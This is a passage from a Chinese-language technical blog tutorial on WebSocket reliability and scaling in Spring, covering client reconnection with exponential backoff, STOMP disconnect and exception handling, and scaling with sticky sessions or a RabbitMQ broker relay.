class="line">&#125;);</span><br><span class="line"></span><br><span class="line">client.<span class="property">onWebSocketClose</span> = <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;WebSocket closed. Will attempt to reconnect.&#x27;</span>, event);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">client.<span class="title function_">activate</span>();</span><br></pre></td></tr></table></figure>

<p><code>reconnectDelay</code> 设置了初始延迟，后续的重连会自动遵循指数退避策略。这是最推荐的方式。</p>
</li>
<li><p><strong>原生 WebSocket 手动实现:</strong><br>如果你使用原生 <code>WebSocket</code> API，需要自己实现这个逻辑。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">connect</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> reconnectAttempts = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> baseDelay = <span class="number">1000</span>; <span class="comment">// 基础延迟 1 秒</span></span><br><span class="line">    <span class="keyword">const</span> maxDelay = <span class="number">30000</span>; <span class="comment">// 最大延迟 30 秒</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">attemptConnection</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> ws = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&#x27;ws://localhost:8080/your-endpoint&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        ws.<span class="property">onopen</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;WebSocket connection established.&#x27;</span>);</span><br><span class="line">            <span class="comment">// 连接成功，重置尝试次数</span></span><br><span class="line">            reconnectAttempts = <span class="number">0</span>; </span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ws.<span class="property">onclose</span> = <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;WebSocket connection closed.&#x27;</span>, event.<span class="property">code</span>, event.<span class="property">reason</span>);</span><br><span class="line">            reconnectAttempts++;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 计算下一次重连的延迟（指数退避 + 随机抖动）</span></span><br><span class="line">            <span class="keyword">const</span> delay = <span class="title class_">Math</span>.<span class="title function_">min</span>(maxDelay, baseDelay * <span class="title class_">Math</span>.<span class="title function_">pow</span>(<span class="number">2</span>, reconnectAttempts));</span><br><span class="line">            <span class="keyword">const</span> jitter = delay * <span class="number">0.2</span> * <span class="title class_">Math</span>.<span class="title function_">random</span>(); <span class="comment">// 增加最多 20% 的抖动</span></span><br><span class="line">            <span class="keyword">const</span> reconnectTimeout = delay + jitter;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Will attempt to reconnect in <span class="subst">$&#123;<span class="built_in">Math</span>.round(reconnectTimeout / <span class="number">1000</span>)&#125;</span> seconds.`</span>);</span><br><span class="line">            <span class="built_in">setTimeout</span>(attemptConnection, reconnectTimeout);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ws.<span class="property">onerror</span> = <span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;WebSocket error:&#x27;</span>, error);</span><br><span class="line">            <span class="comment">// onerror 事件之后通常会立即触发 onclose 事件，所以重连逻辑放在 onclose 中处理</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">attemptConnection</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">connect</span>();</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="2-2-服务端优雅处理连接断开事件"><a href="#2-2-服务端优雅处理连接断开事件" class="headerlink" title="2.2 服务端优雅处理连接断开事件"></a>2.2 服务端优雅处理连接断开事件</h3><p>当一个客户端连接断开时，无论是正常关闭还是异常掉线，服务端都必须能够捕获这个事件并执行相应的清理工作。这被称为“优雅处理”。</p>
<ul>
<li><p><strong>核心任务:</strong></p>
<ol>
<li><strong>释放资源:</strong> 从内存中移除与该会话相关的数据结构（如 Session 对象、用户状态 Map 等），避免内存泄漏。</li>
<li><strong>更新业务状态:</strong> 例如，在聊天室中将用户状态更新为“离线”，在协作文档中释放文档锁。</li>
<li><strong>通知其他用户:</strong> 如果需要，向其他相关的客户端广播该用户离线的消息。</li>
</ol>
</li>
<li><p><strong>Spring STOMP 实现 (<code>SessionDisconnectEvent</code>):</strong><br>Spring 提供了一个非常方便的事件监听机制来处理断连。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebSocketDisconnectListener</span> <span class="keyword">implements</span> <span class="title class_">ApplicationListener</span>&lt;SessionDisconnectEvent&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 假设有一个服务来管理在线用户</span></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> OnlineUserService onlineUserService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> SimpMessagingTemplate messagingTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onApplicationEvent</span><span class="params">(SessionDisconnectEvent event)</span> &#123;</span><br><span class="line">        <span class="type">SimpMessageHeaderAccessor</span> <span class="variable">headerAccessor</span> <span class="operator">=</span> SimpMessageHeaderAccessor.wrap(event.getMessage());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 从会话属性中获取用户信息（在握手拦截器中存入）</span></span><br><span class="line">        <span class="type">Principal</span> <span class="variable">user</span> <span class="operator">=</span> headerAccessor.getUser();</span><br><span class="line">        <span class="type">String</span> <span class="variable">sessionId</span> <span class="operator">=</span> headerAccessor.getSessionId();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (user != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> user.getName();</span><br><span class="line">            System.out.println(<span class="string">&quot;User disconnected: &quot;</span> + username + <span class="string">&quot; (Session ID: &quot;</span> + sessionId + <span class="string">&quot;)&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 1. 更新业务状态：移除在线用户</span></span><br><span class="line">            onlineUserService.removeUser(username);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 2. 通知其他用户：广播更新后的在线用户列表</span></span><br><span class="line">            <span class="comment">// 假设有一个 &quot;/topic/online-users&quot; 主题</span></span><br><span class="line">            messagingTemplate.convertAndSend(<span class="string">&quot;/topic/online-users&quot;</span>, onlineUserService.getOnlineUsers());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             System.out.println(<span class="string">&quot;Anonymous session disconnected: &quot;</span> + sessionId);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 3. 释放其他资源（如果需要）</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>关键点:</strong> 在握手阶段（<code>HandshakeInterceptor</code>）将用户信息（如 <code>Principal</code> 或自定义 User 对象）存入 <code>session.getAttributes()</code>，这样在断开连接时才能识别是哪个用户离线了。</p>
</li>
</ul>
<hr>
<h3 id="2-3-使用-MessageExceptionHandler-统一处理-STOMP-异常"><a href="#2-3-使用-MessageExceptionHandler-统一处理-STOMP-异常" class="headerlink" title="2.3 使用 @MessageExceptionHandler 统一处理 STOMP 异常"></a>2.3 使用 <code>@MessageExceptionHandler</code> 统一处理 STOMP 异常</h3><p>在处理 STOMP 消息（即 <code>@MessageMapping</code> 方法）的过程中，可能会抛出各种异常（如业务校验失败、数据库访问错误等）。如果不加处理，异常会导致连接被关闭。更好的方式是捕获这些异常，并向触发异常的客户端发送一条错误消息。</p>
<p><code>@MessageExceptionHandler</code> 类似于 Spring MVC 中的 <code>@ExceptionHandler</code>，但专用于 WebSocket 消息处理。</p>
<ul>
<li><p><strong>核心优势:</strong></p>
<ul>
<li><strong>集中处理:</strong> 将异常处理逻辑从业务代码中分离出来，保持 <code>@MessageMapping</code> 方法的整洁。</li>
<li><strong>定向发送:</strong> 可以方便地将错误消息只发送给引发异常的用户，而不是广播给所有人。</li>
</ul>
</li>
<li><p><strong>实现步骤:</strong></p>
<ol>
<li>创建一个带有 <code>@ControllerAdvice</code> 注解的类，使其成为一个全局的异常处理器。</li>
<li>在类中定义方法，并使用 <code>@MessageExceptionHandler</code> 注解。该注解可以指定要处理的异常类型。</li>
<li>使用 <code>@SendToUser</code> 注解，将方法的返回值发送到该用户的特定队列（默认为 <code>/user/queue/errors</code>）。</li>
</ol>
</li>
<li><p><strong>示例代码:</strong></p>
<p><strong>1. 可能抛出异常的 Controller:</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChatController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@MessageMapping(&quot;/chat.sendMessage&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sendMessage</span><span class="params">(<span class="meta">@Payload</span> ChatMessage chatMessage, Principal user)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (chatMessage.getContent() == <span class="literal">null</span> || chatMessage.getContent().trim().isEmpty()) &#123;</span><br><span class="line">            <span class="comment">// 抛出业务异常</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Message content cannot be empty.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (chatMessage.getContent().contains(<span class="string">&quot;spam&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SpamMessageException</span>(<span class="string">&quot;Your message was detected as spam.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ... 正常处理消息</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义异常</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpamMessageException</span> <span class="keyword">extends</span> <span class="title class_">RuntimeException</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SpamMessageException</span><span class="params">(String message)</span> &#123; <span class="built_in">super</span>(message); &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>2. 全局异常处理器:</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ControllerAdvice</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebSocketExceptionHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个简单的错误响应体</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ErrorResponse</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> String error;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">ErrorResponse</span><span class="params">(String error)</span> &#123; <span class="built_in">this</span>.error = error; &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理特定类型的业务异常</span></span><br><span class="line">    <span class="meta">@MessageExceptionHandler(SpamMessageException.class)</span></span><br><span class="line">    <span class="meta">@SendToUser(&quot;/queue/errors&quot;)</span> <span class="comment">// 将错误消息发送到 /user/queue/errors</span></span><br><span class="line">    <span class="keyword">public</span> ErrorResponse <span class="title function_">handleSpamMessage</span><span class="params">(SpamMessageException ex)</span> &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;Caught a spam message: &quot;</span> + ex.getMessage());</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ErrorResponse</span>(<span class="string">&quot;Spam detected! Message rejected.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理通用的校验异常</span></span><br><span class="line">    <span class="meta">@MessageExceptionHandler(IllegalArgumentException.class)</span></span><br><span class="line">    <span class="meta">@SendToUser(&quot;/queue/errors&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ErrorResponse <span class="title function_">handleIllegalArgument</span><span class="params">(IllegalArgumentException ex)</span> &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;Invalid argument: &quot;</span> + ex.getMessage());</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ErrorResponse</span>(ex.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理所有其他未捕获的异常</span></span><br><span class="line">    <span class="meta">@MessageExceptionHandler(Exception.class)</span></span><br><span class="line">    <span class="meta">@SendToUser(&quot;/queue/errors&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ErrorResponse <span class="title function_">handleGenericException</span><span class="params">(Exception ex)</span> &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;An unexpected error occurred: &quot;</span> + ex.getMessage());</span><br><span class="line">        <span class="comment">// 注意：生产环境不应将原始异常信息直接暴露给客户端</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ErrorResponse</span>(<span class="string">&quot;An internal server error occurred. Please try again later.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>3. 客户端订阅错误队列:</strong><br>客户端需要订阅这个私有的错误队列来接收错误通知。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用 stompjs</span></span><br><span class="line">client.<span class="property">onConnect</span> = <span class="function">(<span class="params">frame</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Connected: &#x27;</span> + frame);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ... 订阅业务主题</span></span><br><span class="line">    client.<span class="title function_">subscribe</span>(<span class="string">&#x27;/topic/public&#x27;</span>, <span class="function">(<span class="params">message</span>) =&gt;</span> &#123; <span class="comment">/* ... */</span> &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 订阅个人错误队列</span></span><br><span class="line">    client.<span class="title function_">subscribe</span>(<span class="string">&#x27;/user/queue/errors&#x27;</span>, <span class="function">(<span class="params">message</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> error = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(message.<span class="property">body</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Received an error from server:&#x27;</span>, error.<span class="property">error</span>);</span><br><span class="line">        <span class="comment">// 在 UI 上显示错误提示</span></span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&#x27;Error: &#x27;</span> + error.<span class="property">error</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="3-横向扩展：多实例部署"><a href="#3-横向扩展：多实例部署" class="headerlink" title="3. 横向扩展：多实例部署"></a>3. 横向扩展：多实例部署</h2><p>当单个应用实例无法满足高并发或高可用性需求时，就需要进行横向扩展（Horizontal Scaling），即部署多个应用实例并使用负载均衡器分发流量。然而，由于 WebSocket 的<strong>有状态性</strong>，这带来了独特的挑战。</p>
<h3 id="3-1-原生-WebSocket-Spring-原生-WebSocket-的挑战：Sticky-Session"><a href="#3-1-原生-WebSocket-Spring-原生-WebSocket-的挑战：Sticky-Session" class="headerlink" title="3.1 原生 WebSocket&#x2F;Spring 原生 WebSocket 的挑战：Sticky Session"></a><strong>3.1 原生 WebSocket&#x2F;Spring 原生 WebSocket 的挑战：Sticky Session</strong></h3><ul>
<li><p><strong>问题根源：有状态的连接</strong></p>
<ul>
<li>当一个客户端通过 WebSocket 连接到你的服务时，这个 TCP 连接是与<strong>某一个特定</strong>的应用实例（例如 Server A）建立的。</li>
<li>该实例的内存中维护着这个连接的 <code>WebSocketSession</code> 对象以及所有相关状态。</li>
<li>负载均衡器（如 Nginx）默认情况下会使用轮询（Round-Robin）等策略，将请求随机分发到后端的不同服务器上。</li>
</ul>
</li>
<li><p><strong>场景分析：为什么会失败？</strong></p>
<ol>
<li><strong>Client A</strong> 的 WebSocket 连接被负载均衡器分配到了 <strong>Server A</strong>。</li>
<li><strong>Client B</strong> 的 WebSocket 连接被分配到了 <strong>Server B</strong>。</li>
<li>现在，<strong>Client B</strong> 想给 <strong>Client A</strong> 发送一条消息。它将消息通过自己的 WebSocket 连接发送给 <strong>Server B</strong>。</li>
<li><strong>Server B</strong> 接收到消息，但它在其内存中找不到 <strong>Client A</strong> 的 <code>WebSocketSession</code>。这个 Session 存在于 <strong>Server A</strong> 的内存中。</li>
<li><strong>消息无法送达！</strong> Server B 不知道如何将消息路由到 Server A。</li>
</ol>
</li>
<li><p><strong>传统解决方案：Sticky Session (会话保持)</strong></p>
<ul>
<li><p><strong>概念:</strong> 配置负载均衡器，使其能够识别来自同一客户端的所有请求，并始终将它们转发到<strong>同一个</strong>后端服务器。这通常通过 IP 哈希（<code>ip_hash</code> in Nginx）或设置特定的 Cookie 来实现。</p>
</li>
<li><p><strong>Nginx 配置示例 (<code>ip_hash</code>):</strong></p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">upstream</span> websocket_backend &#123;</span><br><span class="line">    ip_hash; // 核心配置：基于客户端 <span class="attribute">IP</span> 地址进行哈希</span><br><span class="line">    server backend1.example.com;</span><br><span class="line">    <span class="attribute">server</span> backend2.example.com;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="section">location</span> /ws/ &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://websocket_backend;</span><br><span class="line">        <span class="attribute">proxy_http_version</span> <span class="number">1</span>.<span class="number">1</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> Upgrade <span class="variable">$http_upgrade</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> Connection <span class="string">&quot;Upgrade&quot;</span>;</span><br><span class="line">        <span class="comment"># ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>Sticky Session 的严重缺陷:</strong></p>
<ol>
<li><strong>破坏了负载均衡的初衷:</strong> 如果某些“粘性”会话的用户活动非常频繁，可能会导致某些服务器负载过高，而其他服务器却很空闲，无法做到真正的负载均衡。</li>
<li><strong>单点故障风险:</strong> 如果 Client A 所在的 Server A 宕机或重启，Client A 的连接会中断。即使它能立即重连，负载均衡器也可能会因为 <code>ip_hash</code> 而继续尝试连接到已经宕机的 Server A，或者即使连接到了 Server B，它之前的会话状态也全部丢失了。</li>
<li><strong>广播&#x2F;群聊实现的复杂性:</strong> 即使使用了 Sticky Session，如果要实现一个跨所有服务器的广播（如系统公告）或群聊，你仍然需要自己实现一套<strong>服务器间的通信机制</strong>（例如，使用 Redis Pub&#x2F;Sub、Kafka 或 Hazelcast），让一个服务器能通知其他所有服务器向它们各自连接的客户端推送消息。这大大增加了系统的复杂性。</li>
</ol>
</li>
</ul>
<hr>
<h3 id="3-2-STOMP-外部消息代理-RabbitMQ-的天然优势"><a href="#3-2-STOMP-外部消息代理-RabbitMQ-的天然优势" class="headerlink" title="3.2 STOMP + 外部消息代理 (RabbitMQ) 的天然优势"></a>3.2 STOMP + 外部消息代理 (RabbitMQ) 的天然优势</h3><p>这套架构是解决 WebSocket 水平扩展问题的<strong>黄金标准</strong>。它通过引入一个外部的、专业的消息中间件（Message Broker）来解耦应用服务器和消息路由。</p>
<ul>
<li><p><strong>核心思想：</strong><br>让应用服务器（你的 Spring Boot 应用）只充当一个“哑”网关（Dumb Gateway）。它的职责是：</p>
<ol>
<li>维护与客户端的 WebSocket 连接。</li>
<li>在 STOMP 协议层面与客户端和外部消息代理进行中继（Relay）。<br>消息的路由、分发、订阅管理等“有状态”的复杂工作全部交给外部的专业消息代理来完成。</li>
</ol>
</li>
<li><p><strong>架构与消息流：</strong></p>
<ol>
<li><strong>连接:</strong> Client 通过负载均衡器（无需 Sticky Session）连接到<strong>任意一个</strong>应用实例（如 Server A）。</li>
<li><strong>订阅:</strong> Client 发送一个 <code>SUBSCRIBE</code> 帧到某个主题（如 <code>/topic/news</code>）。Server A 收到后，并<strong>不是在自己内存中记录</strong>，而是代表该 Client 在外部消息代理（RabbitMQ）上创建一个订阅。</li>
<li><strong>发送消息:</strong> 另一个 Client（可能连接在 Server B）发送一个 <code>SEND</code> 帧到 <code>/topic/news</code>。</li>
<li><strong>中继到代理:</strong> Server B 收到消息后，直接将其<strong>转发</strong>给 RabbitMQ。</li>
<li><strong>代理分发:</strong> RabbitMQ 作为消息中心，知道所有关于 <code>/topic/news</code> 的订阅（包括来自 Server A 和 Server B 的）。它会将消息分发给所有订阅了此主题的应用服务器实例。</li>
<li><strong>推送到客户端:</strong> Server A 收到来自 RabbitMQ 的消息后，查询其<strong>本地</strong>维护的 WebSocket 连接，找到订阅了 <code>/topic/news</code> 的 Client，并将消息通过 WebSocket 推送给它。Server B 也做同样的事情。</li>
</ol>
</li>
<li><p><strong>配置 Spring Boot 使用 STOMP Broker Relay</strong></p>
<p>你需要在 <code>WebSocketMessageBrokerConfigurer</code> 中启用 <code>stompBrokerRelay</code>，并配置外部代理的地址。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableWebSocketMessageBroker</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebSocketConfig</span> <span class="keyword">implements</span> <span class="title class_">WebSocketMessageBrokerConfigurer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">configureMessageBroker</span><span class="params">(MessageBrokerRegistry registry)</span> &#123;</span><br><span class="line">        <span class="comment">// 1. 设置客户端发送消息的目标前缀</span></span><br><span class="line">        registry.setApplicationDestinationPrefixes(<span class="string">&quot;/app&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 2. 启用外部消息代理中继</span></span><br><span class="line">        registry.enableStompBrokerRelay(<span class="string">&quot;/topic&quot;</span>, <span class="string">&quot;/queue&quot;</span>) <span class="comment">// 声明哪些前缀由外部代理处理</span></span><br><span class="line">                .setRelayHost(<span class="string">&quot;localhost&quot;</span>)     <span class="comment">// RabbitMQ 主机地址</span></span><br><span class="line">                .setRelayPort(<span class="number">61613</span>)           <span class="comment">// RabbitMQ STOMP 插件默认端口</span></span><br><span class="line">                .setClientLogin(<span class="string">&quot;guest&quot;</span>)       <span class="comment">// 连接 RabbitMQ 的用户名</span></span><br><span class="line">                .setClientPasscode(<span class="string">&quot;guest&quot;</span>);   <span class="comment">// 连接 RabbitMQ 的密码</span></span><br><span class="line">                <span class="comment">// 对于生产环境，还应配置 systemLogin/systemPasscode 用于服务器自身的连接</span></span><br><span class="line">                <span class="comment">// .setSystemLogin(&quot;user&quot;)</span></span><br><span class="line">                <span class="comment">// .setSystemPasscode(&quot;password&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... registerStompEndpoints 配置保持不变</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注意:</strong> 你需要确保你的 RabbitMQ 已经安装并启用了 <code>rabbitmq_stomp</code> 插件。<br><code>rabbitmq-plugins enable rabbitmq_stomp</code></p>
</li>
<li><p><strong>天然优势总结:</strong></p>
<table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left">Sticky Session 方案</th>
<th align="left">STOMP + Broker Relay 方案</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>架构复杂度</strong></td>
<td align="left">高（需要手动实现服务器间通信）</td>
<td align="left">低（配置即可，复杂性由 Broker 处理）</td>
</tr>
<tr>
<td align="left"><strong>可扩展性</strong></td>
<td align="left">差（负载不均，难以扩展）</td>
<td align="left"><strong>极好</strong>（应用实例无状态，可随意增减）</td>
</tr>
<tr>
<td align="left"><strong>可用性</strong></td>
<td align="left">差（服务器宕机导致会话丢失）</td>
<td align="left"><strong>高</strong>（客户端可重连至任何实例，Broker 可集群）</td>
</tr>
<tr>
<td align="left"><strong>负载均衡</strong></td>
<td align="left">策略受限 (ip_hash)</td>
<td align="left">灵活（Round-Robin, Least Connections 等）</td>
</tr>
<tr>
<td align="left"><strong>耦合度</strong></td>
<td align="left">应用服务器间紧密耦合</td>
<td align="left"><strong>松散耦合</strong>（应用服务器与 Broker 通信）</td>
</tr>
</tbody></table>
</li>
</ul>
